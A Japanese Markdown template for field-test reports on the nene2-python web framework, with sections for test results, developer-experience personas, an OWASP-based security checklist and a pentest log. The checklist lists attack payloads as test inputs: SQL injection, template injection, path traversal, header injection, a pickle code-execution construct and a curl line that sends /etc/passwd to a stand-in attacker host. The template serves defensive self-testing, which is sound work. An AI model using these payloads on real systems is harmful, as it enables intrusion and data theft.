# FT[番号]: [モジュール/テーマ名]

**日付**: YYYY-MM-DD
**テーマ**: [テーマの1行説明]
**セキュリティ診断**: なし ／ **あり**（FT番号が3の倍数）

---

## 概要

[検証対象のモジュール・パターンの説明と、このFTで何を確認するか]

---

## 実装したサンプルアプリ

**場所**: `/home/xi/docker/nene2-python-FT/ftNNN-テーマ名/`

### 主要機能

| 関数/クラス | 概要 |
|---|---|
| `function_name()` | 説明 |

### HTTP エンドポイント

| メソッド | パス | 概要 |
|---|---|---|
| GET | `/path` | 説明 |

---

## テスト結果

**N passed**

```
N passed in X.XXs
```

---

## 摩擦ポイント

<!-- 摩擦ゼロの場合: **今回の FT では実装上の摩擦はゼロだった。** -->

### F-1: [タイトル]（深刻度: 高 / 中 / 低）

**事象**: 何が起きたか  
**原因**: なぜそうなるか  
**対応**: ドキュメント追記・設計改善・Issue 化のどれか

---

## 観察点

### 観察1: [タイトル]

```python
# コード例
```

[解説]

---

## nene2-python フレームワークとの統合

- [統合時の知見・注意点]

---

## Developer Experience (DX) Review

### ペルソナ1: 初心者（Python 歴1年・独学中・女性・バックエンド志望）

ドキュメントを読みながら実装する段階。型ヒントや DI の概念は理解しているが、
フレームワーク固有の「なぜ」が腑に落ちにくいことがある。

**ドキュメント理解**: [公開ドキュメントだけで実装できるか。どこが分かりにくいか]  
**事故リスク**: 高 / 中 / 低。[誤った使い方が「普通の書き方」に見えるか。バグが発見しにくいか]  
**規約の使いやすさ**: [一度理解すれば機械的に書けるか。最初の壁はどこか]

### ペルソナ2: ロースキル経験者（Python 歴3-4年・スクリプト系・男性・SES）

既存コードをコピーして使うスタイル。DI コンテナに慣れているが深くは理解していない。
正しく書けても後で「これでいいだろう」と変更して壊すリスクがある。

**コピペ可能性**: [サンプルコードを見て正しく書けるか]  
**拡張時の罠**: [既存コードを変更するときに踏みやすいミスがあるか]  
**セキュリティ的な事故リスク**: 高 / 中 / 低。[金銭的損害につながる誤用があるか]

### ペルソナ3: フロントエンド寄り経験者（React/TS 歴4年・バックエンド転向中・ノンバイナリ）

API クライアント側も実装する立場。エラーレスポンスの質を気にする。
Python 固有の非同期・型システムの概念が馴染み薄い可能性がある。

**エラーレスポンスの質**: [Problem Details が返るか。クライアント実装のしやすさ]  
**Python 固有概念の学習コスト**: [asyncio / dataclass / Pydantic の壁]  
**事故リスク**: 低 / 中 / 高。

### ペルソナ4: バックエンド経験者（Django/FastAPI 歴5-6年・男性・リードエンジニア）

他フレームワークとの比較視点で評価する。nene2-python の「薄さ」—
フレームワークマジックなし・明示的 DI—を評価できるが、
慣れた Django パターンとの差異に注意が必要。

**他フレームワークとの差異**: [Django ORM / FastAPI Depends との比較]  
**nene2-python の薄さへの評価**: [明示的 DI は好意的に受け取られるか]  
**本番投入可能性**: [チームで使えるか。コードレビューポイントは何か]

### ペルソナ5: シニアエンジニア（設計・コードレビュー担当・女性・10-12年）

チームで nene2-python を使う場合のリスクを評価する。
セキュリティ事故リスクを重視し、mypy / ruff ルールの妥当性を検査する。

**コードレビューチェックポイント**:
- [ ] [チームメンバーが誤りやすい箇所]
- [ ] [静的解析で検出できない罠]

**チームでの安全な共有パターン**: [convex hull — 初心者でも安全に使える API 設計か]  
**ツール追加の必要性**: [ruff ルール / mypy プラグインで追加すべきものがあるか]

### ペルソナ6: 設計者・ポリシー照合（nene2-python 設計ポリシー目線）

CLAUDE.md で掲げたポリシーとの整合性を検査する。

**ポリシー達成度**: 高 / 中 / 低  
**「初心者でも安全な API」達成度**: 高 / 中 / 低  
**設計上の負債・ドキュメント不足**: [具体的な指摘]  
**Follow-up Issue 候補**: [#XXX または「なし」]

---

## セキュリティ診断（FT番号が3の倍数のときのみ実施）

> **診断方針**: Django・FastAPI・SQLAlchemy 本体でも CVE が報告されてきたレベルの
> 攻撃ベクターを対象とする。「動いているから安全」は不正解。
> 実装ミスが起きやすい箇所を意図的に探し、問題がなければその理由まで記録する。

### 1. OWASP API Security Top 10 (2023)

#### API1: オブジェクトレベルの認可不備 (BOLA / IDOR)
- [ ] 他ユーザーの `note_id` を指定して `/notes/{note_id}` に GET/PUT/DELETE 可能か
- [ ] パスパラメータを差し替えても所有者チェックが機能するか
- 攻撃例: `GET /notes/2` をユーザーID=1 のトークンで叩く
- **結果**:

#### API2: 認証の破損 (Broken Authentication)
- [ ] Authorization ヘッダーなしで保護エンドポイントにアクセス可能か
- [ ] 改ざん JWT（`alg: none`、RS256→HS256 変換、署名部削除）が受け入れられるか
- [ ] 期限切れトークンが 401 で拒否されるか
- [ ] APIキーを URL クエリパラメータで渡した場合にログに記録されないか
- 攻撃例: `Authorization: Bearer xxxxx.yyyyy.` (署名なし)
- **結果**:

#### API3: オブジェクトプロパティレベルの認可不備 (Mass Assignment)
- [ ] Pydantic Body に定義されていないフィールド（`is_admin: true` 等）を送っても無視されるか
- [ ] `model_config = ConfigDict(extra="forbid")` が有効か、または extra フィールドが内部に漏れないか
- 攻撃例: `{"title": "test", "is_admin": true, "role": "superuser"}` を POST
- **結果**:

#### API4: 無制限リソース消費 (Unrestricted Resource Consumption)
- [ ] `?limit=1000000` を送っても `MAX_PAGE_SIZE=100` でブロックされるか
- [ ] `RequestSizeLimitMiddleware` が巨大ペイロード（>設定値）を 413 で拒否するか
- [ ] `ThrottleMiddleware` がレートリミット超過で 429 を返すか
- [ ] 深くネストした JSON（50階層以上）でスタックオーバーフローしないか
- 攻撃例: `{"a": {"a": {"a": ...}}}` を 1000 階層で送信
- **結果**:

#### API5: 機能レベルの認可不備 (Broken Function Level Authorization)
- [ ] 管理者専用エンドポイントが一般ユーザーから叩けないか
- [ ] HTTP メソッドの差し替え（`X-HTTP-Method-Override: DELETE`）で予期しない操作が実行されないか
- [ ] `/docs`、`/openapi.json` が `APP_ENV=production` で無効化されているか
- **結果**:

#### API6: サーバーサイドリクエストフォージェリ (SSRF)
- [ ] URL を受け取るフィールドで内部サービス（`http://localhost:6379`、`http://169.254.169.254/`）に到達できるか
- [ ] AWS メタデータエンドポイント（`http://169.254.169.254/latest/meta-data/`）への到達を確認
- 攻撃例: `{"callback_url": "http://127.0.0.1:8080/admin"}`
- **結果**:

#### API7: セキュリティの設定ミス
- [ ] `SecurityHeadersMiddleware` が全レスポンスに以下を付与しているか:
  - `X-Content-Type-Options: nosniff`
  - `X-Frame-Options: DENY`
  - `Content-Security-Policy`
  - `Referrer-Policy`
  - `Permissions-Policy`
- [ ] `APP_DEBUG=false` 時にスタックトレースが公開レスポンスに含まれないか
- [ ] CORS が `allow_origins=["*"]` になっていないか（開発環境含む）
- [ ] エラーレスポンスに内部パス・モジュール名・DB スキーマが含まれないか
- **結果**:

#### API8: バージョン管理の欠落
- [ ] 古いバージョンのエンドポイントが残っていないか（`/v1/`, `/v2/` の混在）
- [ ] 非推奨の `_deprecated_` 系関数が本番コードに残っていないか
- **結果**:

#### API9: 不適切な在庫管理
- [ ] デバッグ・開発用エンドポイント（`/debug`、`/internal`、`/__admin__`）が認証なしで公開されていないか
- [ ] テスト用の固定APIキー・シークレットがコードにハードコードされていないか
- 確認方法: `grep -r "secret\|password\|api_key\|token" src/ --include="*.py" | grep -v "SecretStr\|test"`
- **結果**:

#### API10: 安全でない API の消費
- [ ] 外部 API レスポンスを Pydantic で検証してから使用しているか（raw dict のまま信頼しないか）
- [ ] 外部データを `eval()`/`exec()`/`pickle.loads()` に渡していないか
- **結果**:

---

### 2. インジェクション攻撃

#### SQL インジェクション
- [ ] すべての SQL がパラメータ化クエリか（ruff S608 で文字列フォーマット禁止を確認）
- [ ] SQLAlchemy raw query で `text()` を使う場合にバインドパラメータを使用しているか
- [ ] ORM のフィルター条件にユーザー入力が直接渡されていないか

攻撃ペイロード（SQLite / MySQL 両対応）:
```
' OR '1'='1
'; DROP TABLE notes; --
1 UNION SELECT username,password FROM users--
' AND SLEEP(5)--
```
- **結果**:

#### コマンドインジェクション
- [ ] `subprocess.run()` に `shell=True` がないか（ruff S602 で確認）
- [ ] `os.system()`、`os.popen()` が使われていないか（ruff S605）
- [ ] `shlex.quote()` なしにユーザー入力をコマンド引数にしていないか

攻撃ペイロード:
```
; cat /etc/passwd
| curl http://attacker.com/exfil?data=$(cat /etc/passwd)
$(id)
`id`
```
- **結果**:

#### パストラバーサル
- [ ] ファイルパス操作が `pathlib.Path` を経由しているか
- [ ] `..` を含むパスを `Path.resolve()` 後にベースディレクトリ内か確認しているか
- [ ] ユーザー入力のファイル名で `open()` を直接呼んでいないか

攻撃ペイロード:
```
../../etc/passwd
%2e%2e%2fetc%2fpasswd
....//....//etc/passwd
/proc/self/environ
```
- **結果**:

#### サーバーサイドテンプレートインジェクション (SSTI)
- [ ] Jinja2 テンプレートにユーザー入力が `render_template_string()` で渡されていないか
- [ ] FastAPI の `HTMLResponse` でユーザー入力を文字列フォーマットしていないか

攻撃ペイロード:
```
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}}{%endfor%}
```
- **結果**:

#### HTTP ヘッダーインジェクション
- [ ] ユーザー入力をレスポンスヘッダーに直接セットしていないか
- [ ] リダイレクト先 URL の検証（`Location` ヘッダー）がされているか（オープンリダイレクト防止）

攻撃ペイロード:
```
\r\nSet-Cookie: session=evil
\r\nLocation: http://attacker.com
```
- **結果**:

---

### 3. 認証・認可

- [ ] パスワードが `bcrypt` / `argon2-cffi` でハッシュ化されているか（MD5・SHA-1 は CVE 直結）
- [ ] ランダムトークン生成に `secrets` モジュールのみ使用（`random` は疑似乱数で予測可能）
- [ ] JWT `alg` フィールドを許可リストで検証しているか（`alg: none` は複数の JWT ライブラリで CVE）
- [ ] セッション固定攻撃 (Session Fixation) への対策があるか（ログイン後にセッションIDを再生成）
- [ ] タイミング攻撃: パスワード比較に `hmac.compare_digest()` / `secrets.compare_digest()` を使用しているか（`==` 比較は timing leak）
- [ ] `SecretStr` が `.get_secret_value()` 呼び出し以外でログ出力されないか
- **結果**:

---

### 4. 入力バリデーション

- [ ] すべての HTTP 境界入力（Body・Query・Path・Header）が Pydantic / FastAPI で型検証されているか
- [ ] 文字列フィールドに `max_length` があるか（無制限は DoS・DB カラムオーバーフロー）
- [ ] 数値フィールドに `ge` / `le` / `gt` / `lt` 範囲制限があるか
- [ ] Pydantic `model_validator` で複数フィールドの相関チェックをしているか（例: end_date > start_date）
- [ ] Unicode 正規化: NFD/NFC の違いでバリデーション回避が起きないか
- [ ] Null バイト (`\x00`) を含む文字列が DB に書き込まれないか

テスト入力:
```python
"A" * 100_000          # 上限超え
-1                     # 負の数
1e308                  # float オーバーフロー
"\x00evil"             # Null バイト
"‮" + "txt.exe"   # RTL オーバーライド（ファイル名偽装）
"<script>alert(1)</script>"  # XSS（JSON API なら影響小だが確認）
```
- **結果**:

---

### 5. 情報漏洩

- [ ] 500 エラー時に `APP_DEBUG=false` でスタックトレースが返らないか
- [ ] DB 接続情報・内部パス・モジュール構造がエラーレスポンスに含まれないか
- [ ] `logging` の出力に `SecretStr` フィールドが平文で出力されないか
- [ ] レスポンスヘッダーに `Server: uvicorn` 等の実装詳細が含まれるか（露出は推奨しない）
- [ ] `git log --all --full-history -- '*.env'` でシークレットがコミット履歴に残っていないか
- [ ] `pip-audit` で既知 CVE がないか（CI 必須）

```bash
uv run pip-audit
```
- **結果**:

---

### 6. Python / FastAPI / SQLAlchemy 固有の攻撃ベクター

#### ReDoS (Regular Expression DoS)
バックトラッキングが爆発するパターンへの長大な入力でサーバーが応答不能になる。
Django の `EmailValidator` でも過去に CVE が出ている。
- [ ] ユーザー入力をパターンとして `re.compile()` / `re.match()` に渡していないか
- [ ] 複雑な正規表現（例: `(a+)+`, `(a|aa)+`）に長大な入力を送ってもタイムアウトするか

テスト入力:
```python
"a" * 30 + "!"   # バックトラッキング爆発パターン
re.match(r"^(a+)+$", "a" * 30 + "!")  # → 数分かかることがある
```
- **結果**:

#### pickle / yaml / marshal インジェクション
- [ ] `pickle.loads()` に外部データを渡していないか（ruff S301 で強制、任意コード実行に直結）
- [ ] `yaml.load()` ではなく `yaml.safe_load()` を使っているか（ruff S506）
- [ ] `marshal.loads()` を外部データで使っていないか

攻撃ペイロード（pickle）:
```python
import pickle, os
payload = pickle.dumps(eval(compile("raise Exception(os.popen('id').read())", "<>", "exec")))
```
- **結果**:

#### 非同期レースコンディション
Starlette / FastAPI の非同期処理でグローバル状態を共有すると競合が発生する。
- [ ] グローバル変数・クラス変数への非同期書き込みに `asyncio.Lock()` を使っているか
- [ ] DB トランザクションが `SERIALIZABLE` 分離レベルで保護されているか（必要な場合）
- [ ] TOCTOU（Time-of-Check-to-Time-of-Use）: 認証チェック後の状態変化を考慮しているか
- **結果**:

#### 型強制攻撃 (Pydantic Type Coercion)
Pydantic v2 は積極的に型を変換する。意図しない変換が security boundary を破る場合がある。
- [ ] `bool` フィールドに `"yes"` / `"on"` / `1` を送って `true` に変換されないか確認
- [ ] `int` フィールドに `"1e5"` (文字列) を送って `100000` に変換されないか確認
- [ ] `ConfigDict(strict=True)` が必要な箇所に設定されているか

テスト:
```python
{"is_public": "yes"}    # → True に変換される可能性
{"limit": "1e5"}        # → 100000 として扱われる可能性
{"user_id": 1.9}        # → int(1.9) = 1 に変換される可能性
```
- **結果**:

#### FastAPI 依存性インジェクションのバイパス
- [ ] `Depends()` で認証を行う場合、ルートハンドラーから直接関数を呼んで Depends をスキップしていないか
- [ ] `BackgroundTasks` で認証コンテキストが引き継がれるか（バックグラウンドタスクは認証済みリクエストと同じスコープか）
- **結果**:

#### SQLAlchemy ORM バイパス
- [ ] `text()` で書いた raw SQL にバインドパラメータ（`:param`）を使っているか
- [ ] `filter(Model.column == user_input)` で ORM フィルターに直接文字列を渡していないか
- [ ] `execute(f"SELECT ...")` の f-string 形式がないか
- **結果**:

---

### 7. 依存関係の脆弱性スキャン

```bash
uv run pip-audit --format=json | python -c "
import json, sys
data = json.load(sys.stdin)
vulns = [v for pkg in data for v in pkg.get('vulns', [])]
critical = [v for v in vulns if v.get('fix_versions')]
print(f'Total: {len(vulns)} / Fixable: {len(critical)}')
for v in vulns:
    print(f\"  {v['id']} {v.get('aliases', [])} — {v['description'][:80]}\")
"
```

- **スキャン結果**: CRITICAL: N件 / HIGH: N件 / MEDIUM: N件 / LOW: N件
- **対応方針**: [即時対応 / 次スプリントで対応 / 許容（理由を記載）]

---

### 診断サマリー

| カテゴリ | 結果 | 最重要発見 |
|---|---|---|
| OWASP API Security Top 10 | ✅ 全通過 / ⚠️ N件要対応 / ❌ N件ブロック | - |
| SQL インジェクション | ✅ / ⚠️ / ❌ | |
| コマンドインジェクション | ✅ / ⚠️ / ❌ | |
| パストラバーサル | ✅ / ⚠️ / ❌ | |
| SSTI | ✅ / ⚠️ / ❌ | |
| 認証・認可 | ✅ / ⚠️ / ❌ | |
| 入力バリデーション | ✅ / ⚠️ / ❌ | |
| 情報漏洩 | ✅ / ⚠️ / ❌ | |
| ReDoS | ✅ / ⚠️ / ❌ | |
| pickle / yaml | ✅ / ⚠️ / ❌ | |
| 非同期レースコンディション | ✅ / ⚠️ / ❌ | |
| 型強制攻撃 | ✅ / ⚠️ / ❌ | |
| 依存関係 CVE | ✅ / ⚠️ / ❌ | |

**総合評価**: 合格 / 条件付き合格（N件を次FTまでに修正） / 不合格（マージ前に必須修正）  
**発見した脆弱性**: N件（CRITICAL: N / HIGH: N / MEDIUM: N / LOW: N）  
**新規セキュリティ Issue**: #XXX

---

## クラッカーペンテスト（FT172, 176, 180... のみ実施）

> **実施方針**: チェックリストではなく、実際に攻撃ペイロードを送り込んで耐えられるかを試験する。
> クラッカーは公開 API の仕様から内部構造を推測し、想定外の入力で動作を崩そうとする。
> 「正常系しかテストしていないコード」に発見があるかを確認する。

### フェーズ1: 構造推測（攻撃者の視点）

- **公開情報から推測できる内部構造**:
  - [OpenAPI スキーマから推測したモデル構造・DB 構造]
  - [エラーメッセージから漏洩する実装詳細]
  - [レスポンスタイミングから推測できる処理]

### フェーズ2: 攻撃実行ログ

各攻撃について: 試みたペイロード → 実際のレスポンス → 判定（耐えた / 突破 / 予期しない動作）

#### A. Pydantic バイパス攻撃
```
# 型強制でバリデーションを回避する試み
```
**結果**:

#### B. ビジネスロジック攻撃（ステート破壊）
```
# 状態遷移の不正操作・競合状態の悪用
```
**結果**:

#### C. 境界値・エッジケース攻撃
```
# 上限/下限の境界・null・空文字・Unicode の悪用
```
**結果**:

#### D. 情報収集攻撃（エラーメッセージ解析）
```
# 意図的にエラーを発生させて内部情報を抽出
```
**結果**:

#### E. DoS 試み
```
# CPU/メモリを枯渇させる入力パターン
```
**結果**:

### フェーズ3: 攻撃まとめ

| 攻撃カテゴリ | 試みた攻撃数 | 突破 | 耐えた | 予期しない動作 |
|---|---|---|---|---|
| Pydantic バイパス | N | 0 | N | 0 |
| ビジネスロジック | N | 0 | N | 0 |
| 境界値/エッジ | N | 0 | N | 0 |
| 情報収集 | N | 0 | N | 0 |
| DoS | N | 0 | N | 0 |

**攻撃耐性評価**: 堅牢 / 軽微な問題あり / 要修正  
**発見した弱点**: [具体的な改善点]

---

## Follow-up Issues

| 優先度 | タイトル | 種別 |
|---|---|---|
| 高 | [ドキュメント追記・設計修正・セキュリティ対応] | docs / feat / fix / security |
| 中 | | |
| 低 | | |

---

## まとめ

[実装と診断の総括。次のFTへのつなぎ]
